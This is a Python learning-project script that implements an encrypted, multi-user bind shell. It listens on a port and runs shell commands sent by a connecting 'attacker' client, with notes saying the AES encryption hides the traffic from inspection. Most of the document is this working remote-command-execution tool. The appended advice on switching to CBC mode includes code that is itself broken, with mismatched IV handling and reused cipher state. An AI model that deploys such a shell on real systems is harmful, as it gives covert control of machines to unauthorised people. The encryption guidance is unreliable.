'''run these commands in the vscode terminal:-
        source myenv/bin/activate (if not already in venv)
        python3 ebs.py -h (for help)
        python3 ebs.py -l (for starting bind shell and listning)



after that open a terminal and cd to this directory(cd /home/gaurav/codes/python\ for\ hackers/python\ 201/Python\ Projects/encrypted\ bind\ shell)
and run this code using below commands:-

        source myenv/bin/activate
        python3 ebs.py -c 127.0.0.1 -k fbacdc71d02176d50157ee33d37e00ab421e75e82ceb600908ef9000d24a17ea (there is a new key every time so use that new key )                 

(this will connect attacker(terminal) and server(vscode terminal) and we can run commands through attacker(terminal) on server(vscode terminal))
hence thsese commands are being executed by this bind shell 


this blind shell has encryption we can check using wireshark 
'''



import socket, subprocess, threading,argparse

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

DEFAULT_PORT = 1234
MAX_BUFFER = 4096

class AESCipher:
    def __init__(self, key=None) :
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key , AES.MODE_ECB)

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()
    

    def decrypt(self,encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)
    
    def __str__(self) :
        return "key -> {}".format(self.key.hex())
    


def encrypted_send(s,msg):
    s.send(cipher.encrypt(msg).encode("latin-1"))


def execute_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e).encode()
    return output

def decode_and_strip(s):
    return s.decode("latin-1").strip()

def shell_thread(s):
    encrypted_send(s, b"[ -- Connected! --]")

    try:
        while True:
            encrypted_send(s, b"\r\nEnter Command>")

            data = s.recv(MAX_BUFFER)
            if data :
                buffer = cipher.decrypt(decode_and_strip(data))
                buffer = decode_and_strip(buffer)

                if not buffer or buffer == "exit":
                    s.close()
                    exit()

            print("> Executing command: '{}' ".format(buffer))
            encrypted_send(s, execute_cmd(buffer))

    except:
        s.close()
        exit()

def send_thread(s):
    try:
        while True:
            data = input() + "\n"
            encrypted_send(s, data.encode("latin-1"))

    except:
        s.close()
        exit()

def recv_thread(s):
    try :
        while True:
            data = decode_and_strip(s.recv(MAX_BUFFER))
            if data:
                data = cipher.decrypt(data).decode("latin-1")
                print( data, end="", flush=True)

    except:
        s.close()
        exit()


def server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", DEFAULT_PORT))
    s.listen()

    print("[ -- Starting bind shell! --]")
    while True:
        client_socket , addr = s.accept()
        print("[ -- New user connected! -- ]")
        threading.Thread(target=shell_thread, args=(client_socket,)).start()



def client(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, DEFAULT_PORT))

    print("[ -- Connecting bind shell! -- ]")

    threading.Thread(target=send_thread, args=(s,)).start()
    threading.Thread(target=recv_thread, args=(s,)).start()



parser = argparse.ArgumentParser()

parser.add_argument("-l", "--listen", action="store_true", help="Setup a bind shell", required=False)

parser.add_argument("-c", "--connect", help="connect to a bind shell", required=False )

parser.add_argument("-k", "--key", help="Encryption key", type=str, required=False)
args = parser.parse_args()

if  args.connect and not args.key:
    parser.error("-c CONNECT requires -k KEY!")

if args.key:
    cipher = AESCipher(bytearray.fromhex(args.key))
else:
    cipher = AESCipher()

print(cipher)

if args.listen:
    server()
elif args.connect:
    client(args.connect)


#print(execute_cmd("whoami"))



'''if we use a wrong/different key we will still get connected to the server but the server wont be able to decrypt our commands/data 
hence it will not be  able understand what we are telling it to do and therefore it wont work without the correct encryption key that is generated
new for every new session



so here we have created a multiuser bind shell which has support for 
both server and client functionality depending on how a user starts the 
script 

i.e we can make vscode terminal (attacker) and terminal (server) 
just need to reverse the way we execute the code




PS:- The encryption used in this script is AES (Advanced Encryption Standard) in ECB (Electronic Codebook) mode. AES is a symmetric key encryption algorithm widely used for 
securing data. In this script, an AES cipher is created with a randomly generated 256-bit key (32 bytes). The cipher is used to encrypt and decrypt messages sent between
the client (attacker) and the server.

However, it's important to note that ECB mode is not recommended for secure communication due to its vulnerability to certain attacks, such as pattern recognition in 
the encrypted data. It's generally recommended to use more secure modes like CBC (Cipher Block Chaining) or GCM (Galois/Counter Mode) for encryption. 




For secure communication, it's generally recommended to use AES in a mode that provides both confidentiality and integrity, such as CBC (Cipher Block Chaining) or 
GCM (Galois/Counter Mode).

CBC (Cipher Block Chaining): This mode XORs each plaintext block with the previous ciphertext block before encryption. It requires an initialization vector (IV) 
to start the chaining process. CBC provides confidentiality but does not provide integrity checking, so it's often used with an additional integrity check, such as
HMAC (Hash-based Message Authentication Code).

GCM (Galois/Counter Mode): GCM is an authenticated encryption mode that not only provides confidentiality but also ensures the integrity of the encrypted data. It uses a
unique nonce (number used once) for each encryption operation to ensure that the same plaintext encrypted with the same key will produce a different ciphertext each time. 
GCM is widely used for secure communication protocols.

In your script, you can modify the AESCipher class to use CBC or GCM mode instead of ECB for better security. Here's an example of how you might modify the AESCipher class 
to use CBC mode:



class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)
        self.cipher = AES.new(self.key, AES.MODE_CBC)
        self.iv = self.cipher.iv

    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()

    def decrypt(self, encrypted):
        cipher = AES.new(self.key, AES.MODE_CBC, iv=self.iv)
        return unpad(cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)

    def __str__(self):
        return "key -> {}".format(self.key.hex())




Note: Using a secure mode like CBC or GCM is important for protecting your data from various attacks, but it's also important to use a secure method for key exchange 
(e.g., using a secure key exchange protocol like Diffie-Hellman) to ensure that the encryption key is not compromised during transmission.
'''